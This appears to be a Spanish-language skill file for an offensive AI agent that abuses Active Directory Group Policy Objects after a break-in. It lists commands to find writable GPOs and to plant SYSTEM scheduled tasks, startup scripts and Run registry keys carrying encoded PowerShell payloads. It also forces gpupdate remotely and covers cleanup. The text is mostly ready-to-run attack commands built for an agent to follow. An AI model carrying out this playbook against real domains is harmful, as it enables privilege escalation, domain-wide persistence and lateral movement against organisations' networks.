---
name: ad-gpo-abuse
description: Enumerar y modificar GPOs para escalar privilegios, persistir y moverse lateralmente
phase: post
---

# AD GPO Abuse

## Activation Contract

**Cuando se usa:** Post-explotacion cuando el usuario actual tiene permisos de escritura sobre una o mas GPOs, o cuando se busca persistencia a nivel de dominio.

**Input requerido:**
- `domain`: dominio objetivo
- `dc_ip`: IP del Domain Controller
- `target_gpo`: UUID de la GPO modificable (opcional, enumerar primero)
- `target_ous`: OUs donde aplicar la GPO
- `action_type`: StartupScript | LogonScript | ScheduledTask | RegistryMod

**Herramientas:** PowerView, impacket (smbexec), SharpGPOAbuse, Group Policy Management Console, bloodyAD

## Hard Rules

1. Las GPOs se replican a todos los DCs y se aplican en el siguiente gpupdate
2. NO modificar GPOs sin registro del estado original (backup de la GPO)
3. Los cambios via GPO pueden tardar hasta 90 minutos en aplicarse (ciclo de actualizacion)
4. Forzar gpupdate puede detectarse como actividad anómala
5. Preferir Startup Scripts sobre Logon Scripts (ejecutan como SYSTEM)
6. Las GPOs de Default Domain Policy y Default Domain Controllers Policy NO deben modificarse

## Decision Gates

Preguntar antes de cada accion:

- **Enumerar GPOs**: "Enumerar GPOs modificables por nuestro usuario. ?Proceder?"
- **Modificar GPO**: "Agregar script malicioso a la GPO `<gpo_name>`. Se aplicara a las OUs vinculadas. ?Continuar?"
- **Forzar gpupdate**: "Ejecutar gpupdate /force en maquinas target. Puede alertar. ?Autorizado?"
- **Persistencia via GPO**: "Establecer persistencia via tarea programada en GPO. ?Proceder?"

## Execution Steps

### 1. Enumerar GPOs modificables

```powershell
# PowerView: GPOs donde nuestro usuario tiene permisos de escritura
Get-NetGPO | Where-Object { $_.GPCMachineExtensionNames -ne $null }
Get-DomainGPO -ResolveGuids | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
  $_.ActiveDirectoryRights -match "Write|Create|Modify|FullControl"
}
```

```bash
# bloodyAD (Linux)
bloodyAD --host <dc_ip> -d <domain> -u <user> -p <pass> get children 'CN=Policies,CN=System,DC=domain,DC=local'
```

### 2. Identificar OUs target

```bash
# Listar OUs y las GPOs vinculadas
impacket-GetADUsers -all -dc-ip <dc_ip> <domain>/<user>:<pass>
```

### 3. Agregar tarea programada maliciosa

```bash
# SharpGPOAbuse (Windows)
SharpGPOAbuse.exe --AddComputerTask --TaskName "Updater" \
  --Author NT AUTHORITY\SYSTEM --Command "powershell.exe" \
  --Arguments "-enc <encoded_payload>" --GPOName "MaliciousGPO"
```

### 4. Agregar Startup Script

```powershell
# PowerView: conectar al SYSVOL y copiar script
$gpo_path = "\\<domain>\SYSVOL\<domain>\Policies\{<GPO_GUID>}\Machine\Scripts\Startup"
Copy-Item .\payload.ps1 $gpo_path

# Modificar scripts.ini
Set-Content "$gpo_path\scripts.ini" "[Startup]
0CmdLine=powershell.exe
0Parameters=-ExecutionPolicy Bypass -File payload.ps1"
```

### 5. Registry modification via GPO

```bash
# bloodyAD: agregar regla de registro
bloodyAD --host <dc_ip> set gpo <target_gpo> registry \
  --key "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" \
  --value-name "Updater" --value "powershell.exe -enc <payload>" \
  --type REG_SZ
```

### 6. Forzar aplicacion

```bash
# En maquina target
gpupdate /force /target:computer
gpupdate /force /target:user

# Remotamente
impacket-wmiexec <domain>/<admin_user>:<pass>@<target> "gpupdate /force"
```

### 7. Cleanup

```bash
# Remover tarea programada de la GPO
SharpGPOAbuse.exe --RemoveTask --TaskName "Updater" --GPOName "MaliciousGPO"

# O eliminar manualmente del SYSVOL
# Restaurar scripts.ini original (backup previo)
```

## Output Contract

```json
{
  "skill": "ad-gpo-abuse",
  "phase": "post",
  "domain": "domain.local",
  "gpo_guid": "{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}",
  "gpo_name": "MaliciousGPO",
  "modified_action": "ScheduledTask",
  "target_ous": ["Domain Computers", "Servers"],
  "payload_command": "powershell.exe -enc <encoded>",
  "execution_context": "SYSTEM",
  "gpupdate_initiated": true,
  "reverted": false,
  "detection_risk": "high"
}
```
